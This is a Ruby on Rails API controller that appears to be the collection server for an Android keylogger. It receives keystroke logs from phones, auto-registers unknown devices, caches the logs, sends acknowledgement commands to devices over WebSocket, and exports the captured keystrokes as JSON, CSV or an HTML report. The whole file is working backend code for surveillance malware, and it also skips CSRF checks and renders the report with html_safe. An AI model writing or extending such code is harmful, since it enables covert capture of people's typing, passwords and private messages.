# frozen_string_literal: true

module Api
  class KeyloggerController < ApplicationController
    skip_before_action :verify_authenticity_token

    # POST /api/keylogger - Receive keylog data from Android client
    def receive
      device_id = params[:device_id]
      keylog_data = params[:data]

      if device_id.blank? || keylog_data.blank?
        render json: { error: 'Missing device_id or data' }, status: :bad_request
        return
      end

      # Find or create smartphone by device_id
      smartphone = Smartphone.find_or_create_by(device_id: device_id) do |phone|
        phone.name = "Device #{device_id[0..7]}"
        phone.operating_system = 'Android'
      end

      # Process keylog data
      processor = KeylogProcessor.new(keylog_data)
      
      # Save to database (could be a dedicated Keylog model)
      Rails.cache.write("keylog_#{device_id}", {
        data: keylog_data,
        processed: processor.stats,
        received_at: Time.current
      }, expires_in: 24.hours)

      render json: {
        status: 'received',
        device_id: device_id,
        stats: processor.stats,
        requires_confirmation: true
      }
    end

    # POST /api/keylogger/ack - Acknowledge keylog reception (clear Android buffer)
    def acknowledge
      device_id = params[:device_id]
      success = params[:success]

      if device_id.blank?
        render json: { error: 'Missing device_id' }, status: :bad_request
        return
      end

      # Send ACK command via WebSocket
      ActionCable.server.broadcast(
        "device_#{device_id}",
        {
          command: 'keylog_ack',
          data: {
            success: success,
            timestamp: Time.current.to_i
          }
        }
      )

      render json: { status: 'ack_sent', device_id: device_id, success: success }
    end

    # GET /api/keylogger/data/:device_id - Get keylog data
    def data
      device_id = params[:device_id]
      cached_data = Rails.cache.read("keylog_#{device_id}")

      if cached_data
        render json: cached_data
      else
        render json: { error: 'No keylog data found' }, status: :not_found
      end
    end

    # GET /api/keylogger/stats/:device_id - Get statistics
    def stats
      device_id = params[:device_id]
      cached_data = Rails.cache.read("keylog_#{device_id}")

      if cached_data
        render json: { device_id: device_id, stats: cached_data[:processed] }
      else
        render json: { error: 'No keylog data found' }, status: :not_found
      end
    end

    # GET /api/keylogger/export/:device_id - Export as CSV or HTML
    def export
      device_id = params[:device_id]
      format = params[:format] || 'html' # 'csv' or 'html'
      cached_data = Rails.cache.read("keylog_#{device_id}")

      if cached_data.nil?
        render json: { error: 'No keylog data found' }, status: :not_found
        return
      end

      processor = KeylogProcessor.new(cached_data[:data])

      case format
      when 'csv'
        send_data processor.to_csv, filename: "keylog_#{device_id}_#{Time.current.to_i}.csv", type: 'text/csv'
      when 'html'
        render html: processor.to_html_report.html_safe
      else
        render json: { error: 'Invalid format (use csv or html)' }, status: :bad_request
      end
    end
  end
end
